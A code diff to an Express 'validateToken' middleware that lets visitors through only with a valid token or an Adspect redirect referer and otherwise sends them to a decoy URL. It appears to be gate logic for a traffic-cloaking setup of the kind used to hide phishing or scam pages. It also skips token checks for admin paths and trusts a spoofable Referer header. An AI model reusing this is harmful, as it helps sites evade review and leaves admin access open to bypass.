@@ -301,26 +301,49 @@ const generateSessionId = (clientIP, userAgent) => {
 };
 
 const validateToken = (req, res, next) => {
-    const isAdminPanel = req.headers.referer?.includes('/admin');
-    const token = req.query.token;
-    
-    // Skip token validation for admin panel and static assets
-    if (isAdminPanel || req.path.match(/\.(js|css|png|jpg|jpeg|gif|ico|svg)$/)) {
+    // List of paths that should skip token validation
+    const skipPaths = [
+        '/admin',
+        '/admin/',
+        '/generate-token',
+        '/socket.io',
+        '/js/',
+        '/css/',
+        '/images/',
+        '/verify-turnstile'
+    ];
+
+    // Skip validation for admin routes and static assets
+    if (skipPaths.some(path => req.path.startsWith(path)) || 
+        req.path.match(/\.(js|css|png|jpg|jpeg|gif|ico|svg)$/)) {
         return next();
     }
 
-    // Check if the request is coming from Adspect
+    // Special handling for root path when it's an admin panel
+    if (req.path === '/' && req.headers.referer?.includes('/admin')) {
+        return next();
+    }
+
+    // Check if the request is coming from Adspect or has a valid token
+    const token = req.query.token;
     const referer = req.headers.referer;
-    const isFromAdspect = referer && referer.includes('redirectingroute.com');
+    const isFromAdspect = referer && referer.includes('redirectionroute.com');
     const isValidToken = token && tokenManager.isValidToken(token);
 
     if (!isFromAdspect && !isValidToken) {
-        console.log('Invalid token or referer:', { token, referer });
+        console.log('Token validation failed:', { 
+            path: req.path,
+            token, 
+            referer,
+            isFromAdspect,
+            isValidToken 
+        });
         return res.redirect(state.settings.redirectUrl);
     }
 
     next();
 };
+
 
 // Initialize server components
 const app = express();
